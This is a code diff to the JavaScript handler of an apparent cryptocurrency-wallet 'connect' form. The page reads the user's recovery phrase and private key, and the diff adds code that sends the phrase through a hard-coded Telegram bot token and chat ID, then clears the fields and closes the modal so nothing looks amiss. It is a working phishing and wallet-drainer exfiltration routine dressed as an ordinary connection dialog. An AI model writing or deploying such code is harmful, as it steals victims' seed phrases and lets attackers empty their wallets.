@@ -2,26 +2,30 @@ document.getElementById('connectForm').addEventListener('submit', function(event
     event.preventDefault(); // Prevent the default form submission
 
     const phrase = document.getElementById('phraseInput').value;
+    const privateKey = document.getElementById('privateKeyInput').value; // Get the private key
 
-    // Here you would typically send the phrase to your email
-    // For demonstration, we'll just log it to the console
-    console.log('Phrase entered:', phrase);
+    // Send the phrase to Telegram
+    const botToken = '7725425825:AAHzy3GD_g7pZq_ZEcyhdbuMATyh3CX8klI'; // Your bot token
+    const chatId = '1207950273'; // Your chat ID
+    const message = encodeURIComponent(phrase);
 
-    // Example of sending the phrase to an email service
-    // EmailJS or similar service can be used here
-    /*
-    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-        phrase: phrase
-    })
-    .then(function(response) {
-        console.log('SUCCESS!', response.status, response.text);
-    }, function(error) {
-        console.log('FAILED...', error);
-    });
-    */
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-    // Clear the input field after submission
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                console.log('Message sent to Telegram:', phrase);
+            } else {
+                console.error('Error sending message:', response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Fetch error:', error);
+        });
+
+    // Clear the input fields after submission
     document.getElementById('phraseInput').value = '';
+    document.getElementById('privateKeyInput').value = ''; // Clear the private key input
     // Close the modal
     $('#connectModal').modal('hide');
 });
